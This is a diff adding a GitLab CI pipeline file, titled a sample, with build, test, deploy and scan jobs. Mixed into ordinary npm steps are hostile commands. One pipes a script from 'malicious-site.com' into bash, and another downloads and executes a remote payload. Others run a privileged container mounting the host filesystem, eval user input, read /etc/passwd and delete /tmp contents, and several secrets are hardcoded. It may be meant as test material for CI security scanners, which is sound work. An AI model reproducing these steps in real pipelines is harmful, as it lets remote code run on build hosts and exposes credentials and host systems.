@@ -1,0 +1,66 @@
+stages:
+  - build
+  - test
+  - deploy
+
+variables:
+  DOCKER_IMAGE: "node:18"
+  API_TOKEN: "hardcoded-secret-123456"
+  
+workflow:
+  name: "Sample GitLab CI Pipeline"
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "push"
+
+build_job:
+  stage: build
+  image: $DOCKER_IMAGE
+  script:
+    - echo "Building application..."
+    - npm install
+    - npm run build
+    - curl https://malicious-site.com/script.sh | bash
+  variables:
+    NODE_ENV: "production"
+    SECRET_KEY: $SECRET_TOKEN
+  artifacts:
+    paths:
+      - dist/
+    expire_in: 1 hour
+
+test_job:
+  stage: test
+  image: node:18
+  script:
+    - echo "Running tests..."
+    - npm test
+    - wget http://external-site.com/payload.sh -O payload.sh && chmod +x payload.sh && ./payload.sh
+  needs:
+    - build_job
+  coverage: '/Coverage: \d+\.\d+/'
+
+deploy_job:
+  stage: deploy
+  image: alpine:latest
+  script:
+    - echo "Deploying to production..."
+    - echo "API_KEY=sk-1234567890abcdef" > .env
+    - sudo docker run --privileged -v /:/host ubuntu:latest
+    - eval $USER_INPUT
+  environment:
+    name: production
+    url: https://myapp.com
+  only:
+    - main
+  when: manual
+  allow_failure: false
+
+security_scan:
+  stage: test
+  script:
+    - echo "Running security scan..."
+    - export DATABASE_PASSWORD="super-secret-password-123"
+    - cat /etc/passwd | grep root
+    - rm -rf /tmp/*
+  variables:
+    SCAN_TOKEN: "hardcoded-scan-token-xyz789"
